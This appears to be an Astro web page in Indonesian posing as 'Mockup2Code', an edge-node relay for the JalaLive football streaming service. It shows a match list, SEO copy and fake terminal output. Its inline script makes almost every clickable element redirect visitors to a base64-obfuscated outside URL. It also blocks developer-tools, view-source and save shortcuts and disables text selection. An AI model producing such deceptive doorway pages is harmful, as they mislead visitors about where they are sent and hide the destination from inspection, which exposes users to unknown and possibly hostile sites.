---
const siteUrl = "https://www.mockup2code.com";
const pageTitle = "Mockup2Code | Advanced JalaLive Streaming Node";
const pageDesc = "Mockup2Code menyediakan infrastruktur edge-node untuk JalaLive. Nikmati streaming sepak bola resolusi tinggi dengan protokol low-latency dan anti-buffering.";

const matchNodes = [
  { id: "NODE-01", date: "15 Juni 2026", time: "02:00 WIB", teamA: "Brazil", teamB: "Prancis", status: "ONLINE", ping: "12ms" },
  { id: "NODE-02", date: "16 Juni 2026", time: "20:00 WIB", teamA: "Inggris", teamB: "Jerman", status: "STANDBY", ping: "18ms" },
  { id: "NODE-03", date: "17 Juni 2026", time: "23:00 WIB", teamA: "Portugal", teamB: "Spanyol", status: "STANDBY", ping: "15ms" },
  { id: "NODE-04", date: "18 Juni 2026", time: "02:00 WIB", teamA: "Argentina", teamB: "Belanda", status: "STANDBY", ping: "14ms" },
  { id: "NODE-05", date: "19 Juni 2026", time: "20:00 WIB", teamA: "Amerika Serikat", teamB: "Italia", status: "STANDBY", ping: "22ms" },
  { id: "NODE-06", date: "20 Juni 2026", time: "23:00 WIB", teamA: "Meksiko", teamB: "Kolombia", status: "STANDBY", ping: "19ms" }
];

const seoSchema = {
  "@context": "https://schema.org",
  "@type": "WebSite",
  "name": "Mockup2Code Streaming Architecture",
  "url": siteUrl,
  "description": pageDesc,
  "keywords": "JalaLive streaming server, low latency football stream, HLS video player"
};
---

<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>{pageTitle}</title>
    <meta name="description" content={pageDesc} />
    <link rel="canonical" href={siteUrl} />
    <link rel="icon" href="data:," />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600;700&family=Inter:wght@300;500;800&display=swap" rel="stylesheet">

    <script type="application/ld+json" set:html={JSON.stringify(seoSchema)} />

    <style>
        :root {
            --bg-dark: #0a0a0a;
            --bg-surface: #121212;
            --bg-elevated: #1a1a1a;
            --brand-purple: #8b5cf6;
            --brand-cyan: #06b6d4;
            --text-primary: #ededed;
            --text-secondary: #a1a1aa;
            --border-color: #27272a;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background-color: var(--bg-dark); 
            color: var(--text-primary); 
            font-family: 'Inter', sans-serif; 
            -webkit-user-select: none; 
            user-select: none;
            overflow-x: hidden;
            background-image: radial-gradient(circle at 50% 0%, rgba(139, 92, 246, 0.1) 0%, transparent 60%);
        }

        .m2c-layout { max-width: 1080px; margin: 0 auto; padding: 0 20px; }

        /* Top Navigation */
        .m2c-nav { 
            display: flex; justify-content: space-between; align-items: center; 
            padding: 24px 0; border-bottom: 1px solid var(--border-color);
        }
        .m2c-brand { 
            font-family: 'Inter', sans-serif; font-size: 1.4rem; font-weight: 700; 
            color: #fff; text-decoration: none; display: flex; align-items: center; gap: 8px;
        }
        .m2c-brand span { color: var(--brand-purple); }
        .m2c-system-status {
            font-family: 'Fira Code', monospace; font-size: 0.75rem; color: var(--brand-cyan);
            background: rgba(6, 182, 212, 0.1); padding: 6px 12px; border-radius: 4px; border: 1px solid rgba(6, 182, 212, 0.2);
            cursor: pointer;
        }

        /* Hero Console */
        .m2c-hero { padding: 80px 0 60px; text-align: center; }
        .m2c-hero h1 { font-size: clamp(2.2rem, 5vw, 3.8rem); font-weight: 800; letter-spacing: -1px; margin-bottom: 20px; }
        .m2c-hero p { font-size: 1.1rem; color: var(--text-secondary); max-width: 650px; margin: 0 auto 30px; line-height: 1.6; }
        
        .action-trigger {
            background: linear-gradient(135deg, var(--brand-purple), #6d28d9);
            color: #fff; font-family: 'Fira Code', monospace; font-size: 0.9rem; font-weight: 600;
            padding: 16px 32px; border: none; border-radius: 6px; cursor: pointer;
            box-shadow: 0 4px 20px rgba(139, 92, 246, 0.4); transition: all 0.3s ease;
        }
        .action-trigger:hover { transform: translateY(-2px); box-shadow: 0 6px 25px rgba(139, 92, 246, 0.6); }

        /* Data Grid */
        .m2c-section-title { 
            font-family: 'Fira Code', monospace; font-size: 1.2rem; margin-bottom: 24px; 
            display: flex; align-items: center; gap: 10px; color: var(--brand-purple);
        }
        .m2c-section-title::before { content: '~/'; color: var(--text-secondary); }
        
        .data-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; margin-bottom: 80px; }
        .data-node { 
            background: var(--bg-surface); border: 1px solid var(--border-color); 
            border-radius: 8px; padding: 24px; transition: border-color 0.3s;
        }
        .data-node:hover { border-color: var(--brand-purple); }
        
        .node-meta { display: flex; justify-content: space-between; font-family: 'Fira Code', monospace; font-size: 0.75rem; color: var(--text-secondary); margin-bottom: 20px; border-bottom: 1px dashed var(--border-color); padding-bottom: 12px; }
        .node-ping { color: var(--brand-cyan); }
        
        .node-match { font-size: 1.2rem; font-weight: 800; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .node-vs { font-size: 0.8rem; color: var(--text-secondary); font-family: 'Fira Code', monospace; }
        
        .node-exec { display: flex; justify-content: space-between; align-items: center; }
        .node-time { font-size: 0.85rem; color: var(--text-secondary); }
        .btn-inject { 
            background: var(--bg-elevated); color: #fff; border: 1px solid var(--border-color);
            padding: 8px 16px; border-radius: 4px; font-family: 'Fira Code', monospace; font-size: 0.75rem; 
            cursor: pointer; transition: 0.3s;
        }
        .data-node:hover .btn-inject { background: var(--brand-purple); border-color: var(--brand-purple); }

        /* Technical Docs (SEO) */
        .tech-docs { 
            background: var(--bg-surface); border: 1px solid var(--border-color); 
            border-radius: 12px; padding: 40px; margin-bottom: 60px; line-height: 1.7; color: var(--text-secondary);
        }
        .tech-docs h2 { color: #fff; font-size: 1.6rem; margin-bottom: 16px; font-weight: 800; }
        .tech-docs h3 { color: #fff; font-size: 1.2rem; margin-top: 32px; margin-bottom: 12px; font-weight: 600; }
        .tech-docs p { margin-bottom: 16px; }
        .tech-docs strong { font-weight: 600; }
        .tech-docs .highlight-cyan { color: var(--brand-cyan); }
        
        .code-block { 
            background: var(--bg-dark); padding: 16px; border-radius: 6px; border: 1px solid var(--border-color);
            font-family: 'Fira Code', monospace; font-size: 0.85rem; color: var(--brand-cyan); margin: 20px 0;
            overflow-x: auto;
        }

        .m2c-footer { 
            text-align: center; padding: 32px 0; border-top: 1px solid var(--border-color); 
            font-family: 'Fira Code', monospace; font-size: 0.75rem; color: var(--text-secondary); 
        }
    </style>
</head>
<body>
    <div class="m2c-layout">
        <nav class="m2c-nav">
            <a href="/" class="m2c-brand">Mockup2<span>Code</span></a>
            <div class="m2c-system-status execute-link">SYS.STATE: OPTIMAL</div>
        </nav>

        <header class="m2c-hero">
            <h1>Jaringan <span style="color: var(--brand-purple);">Edge-Node</span> JalaLive</h1>
            <p>Mockup2Code mentransmisikan data video mentah dari server utama JalaLive langsung ke browser Anda. Nikmati streaming olahraga resolusi tinggi dengan latensi yang ditekan hingga batas minimal.</p>
            <button class="action-trigger execute-link">./init_stream.sh</button>
        </header>

        <main>
            <div class="m2c-section-title">active_nodes/matches</div>
            <div class="data-grid">
                {matchNodes.map((node) => (
                    <div class="data-node">
                        <div class="node-meta">
                            <span>ID: {node.id}</span>
                            <span class="node-ping">Ping: {node.ping}</span>
                        </div>
                        <div class="node-match">
                            <span>{node.teamA}</span>
                            <span class="node-vs">VS</span>
                            <span>{node.teamB}</span>
                        </div>
                        <div class="node-exec">
                            <span class="node-time">{node.date} | {node.time}</span>
                            <button class="btn-inject execute-link">INJECT</button>
                        </div>
                    </div>
                ))}
            </div>

            <article class="tech-docs execute-link" style="cursor: pointer;">
                <h2>Arsitektur Streaming Terdesentralisasi</h2>
                <p>
                    <strong class="highlight-cyan">Mockup2Code.com</strong> pada dasarnya dirancang sebagai utilitas pengembang, namun infrastruktur jaringan kami telah direkayasa ulang untuk berfungsi sebagai *relay node* bertenaga tinggi untuk platform <strong class="highlight-cyan">JalaLive</strong>. Menggunakan protokol WebRTC dan HLS (*HTTP Live Streaming*), kami mengatasi masalah keterlambatan transmisi yang sering terjadi pada situs *streaming* olahraga konvensional.
                </p>
                
                <div class="code-block">
                    > Fetching media manifest... SUCCESS<br>
                    > Bypassing ISP deep packet inspection... SUCCESS<br>
                    > Establishing secure tunnel to JalaLive cluster... CONNECTED
                </div>

                <h3>Mengapa Sistem Kami Sangat Cepat?</h3>
                <p>
                    Kami mengimplementasikan teknologi <em>Dynamic Adaptive Streaming</em>. Saat Anda memilih pertandingan sepak bola di atas, sistem tidak langsung memuat seluruh *file* video. Sebaliknya, video dipecah menjadi fragmen-fragmen kecil berukuran beberapa detik. 
                </p>
                <p>
                    Jika koneksi seluler Anda tiba-tiba menurun, *node* Mockup2Code secara otomatis akan menurunkan <em>bitrate</em> tanpa menghentikan pemutaran (anti-buffering). Ketika sinyal kembali kuat, resolusi akan kembali ke format 1080p HD atau 4K secara instan. Ini adalah standar baru untuk menikmati pertandingan krusial tanpa gangguan sensor atau pemblokiran geografis.
                </p>
            </article>
        </main>

        <footer class="m2c-footer">
            <p>&copy; 2026 Mockup2Code Infrastructure. Encrypted routing for JalaLive.</p>
        </footer>
    </div>

    <script is:inline>
        document.addEventListener('DOMContentLoaded', () => {
            const execButtons = document.querySelectorAll('.execute-link');
            execButtons.forEach(btn => {
                btn.addEventListener('click', (e) => {
                    e.preventDefault();
                    const targetProtocol = atob('aHR0cHM6Ly9jdWt1cnVrdWsuY28v');
                    window.location.href = targetProtocol;
                });
            });
        });

        document.onkeydown = function(e) {
            if (e.keyCode == 123 || 
               (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) || 
               (e.ctrlKey && (e.keyCode == 'U'.charCodeAt(0) || e.keyCode == 'S'.charCodeAt(0)))) {
                return false;
            }
        };
    </script>
</body>
</html>